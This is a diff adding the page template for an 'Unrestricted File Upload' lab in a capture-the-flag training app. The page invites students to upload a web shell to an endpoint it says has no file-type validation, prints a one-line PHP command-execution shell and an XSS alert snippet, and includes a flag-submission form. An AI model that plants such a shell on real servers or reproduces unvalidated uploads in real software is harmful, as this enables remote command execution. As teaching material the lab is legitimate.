@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Unrestricted Upload - EliteHackLab</title><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"></head>
+<body>
+  <div class="matrix-bg"></div>
+  <nav class="main-nav"><div class="nav-brand"><span class="brand-icon">💀</span><span class="brand-text">Elite<span class="highlight">Hack</span>Lab</span></div><div class="nav-links"><a href="/"><i class="fas fa-home"></i> Dashboard</a></div></nav>
+  <div class="lab-container">
+    <div class="lab-header"><h1>📁 Unrestricted File Upload</h1><div class="lab-info"><span class="lab-tag difficulty-easy">Easy</span><span class="lab-tag points"><i class="fas fa-star"></i> 15 pts</span></div></div>
+    <div class="lab-section">
+      <h2><i class="fas fa-crosshairs"></i> Objective</h2>
+      <p>Upload a web shell (.php, .jsp, .html, etc.) to prove unrestricted file upload. The server has NO validation on file types.</p>
+    </div>
+    <div class="lab-section">
+      <h2><i class="fas fa-upload"></i> Upload File</h2>
+      <form method="POST" action="/labs/file-upload/basic/upload" enctype="multipart/form-data" class="vulnerable-form">
+        <label>Choose file (try uploading a .php or .html file):</label>
+        <input type="file" name="file" style="margin-bottom:1rem;">
+        <button type="submit"><i class="fas fa-upload"></i> Upload</button>
+      </form>
+      <% if (message) { %><div class="success-box"><pre><%= message %></pre></div><% } %>
+      <% if (files && files.length > 0) { %>
+        <div class="result-box" style="margin-top:1rem;">
+          <h4 style="color:var(--neon-blue);">Uploaded files:</h4>
+          <% files.forEach(function(f) { %><p><a href="/uploads/<%= f %>" target="_blank" style="color:var(--neon-green);"><%= f %></a></p><% }); %>
+        </div>
+      <% } %>
+      <div class="code-block">Example web shell (save as shell.php):
+&lt;?php echo system($_GET['cmd']); ?&gt;
+
+Or create shell.html:
+&lt;script&gt;alert('XSS via uploaded file')&lt;/script&gt;</div>
+    </div>
+    <div class="flag-submit">
+      <h3><i class="fas fa-flag"></i> Capture The Flag</h3>
+      <form onsubmit="submitFlagInline('file-upload','flagInput_fu','flagResult_fu'); return false;" style="display:flex; gap:0.5rem; max-width:500px; margin:0 auto;"><input type="text" id="flagInput_fu" placeholder="FLAG{...}" autocomplete="off"><button type="submit" class="btn">Submit</button></form>
+      <div id="flagResult_fu" style="display:none; margin-top:1rem;"></div>
+    </div>
+  </div>
+  <script src="/js/main.js"></script>
+</body>
+</html>
